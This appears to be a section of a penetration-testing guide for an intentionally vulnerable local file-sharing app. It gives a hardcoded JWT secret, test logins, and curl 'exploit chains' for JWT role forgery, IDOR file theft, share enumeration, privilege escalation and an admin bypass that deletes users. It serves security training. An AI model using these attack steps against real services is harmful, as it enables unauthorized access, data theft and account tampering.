### JWT forgery

Secret: `kc-secret` (HS256). Role claim is trusted, not re-checked against DB.

```bash
# Login, then forge admin role
TOKEN=$(curl -sS -X POST http://localhost:8080/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@kc.test","password":"UserPass123!"}' | jq -r .token)

# jwt_tool example (if installed):
# jwt_tool $TOKEN -I -pc role -pv admin -S hs256 -k kc-secret
```

### UX vs API rule

Product UI filters files/shares by `ownerId` **client-side**. The API is the real security boundary. Always test with Burp/curl/`/dev`, not UI alone.

## 4. Exploit Chains

### Chain 1: Happy path

```bash
curl -X POST http://localhost:8080/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@kc.test","password":"UserPass123!"}'
# UI: /files shows 2 files
curl http://localhost:8080/api/sharing/public/share-1
curl http://localhost:8080/share/share-1
```

### Chain 2: Horizontal IDOR (files)

```bash
USER_TOKEN=... # login as user@kc.test
curl -H "Authorization: Bearer $USER_TOKEN" http://localhost:8080/api/files | jq .
# Contains other-user-secret.txt (9104) despite UI showing only own files
curl -H "Authorization: Bearer $USER_TOKEN" http://localhost:8080/api/files/9104/download -o stolen.txt
```

### Chain 3: Share enumeration

```bash
for i in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:8080/api/sharing/public/share-$i")
  echo "share-$i: $code"
done
```

### Chain 4: JWT vertical escalation

```bash
# Forge role:admin in JWT using kc-secret, then:
curl -H "Authorization: Bearer $FORGED_ADMIN" http://localhost:8080/api/admin/stats
curl -H "Authorization: Bearer $FORGED_ADMIN" http://localhost:8080/api/admin/users
```

### Chain 5: Moderator escalation chain

```bash
MOD_TOKEN=... # login as mod@kc.test
curl -X PUT -H "Authorization: Bearer $MOD_TOKEN" \
  http://localhost:8080/api/admin/users/9001/role/escalate
# Promotes user 9001 to moderator (CWE-269)
```

### Chain 6: Admin guard bypass

```bash
USER_TOKEN=... # any authed user
curl -H "Authorization: Bearer $USER_TOKEN" http://localhost:8080/api/admin/audit-logs
curl -X DELETE -H "Authorization: Bearer $USER_TOKEN" http://localhost:8080/api/admin/users/9004
```
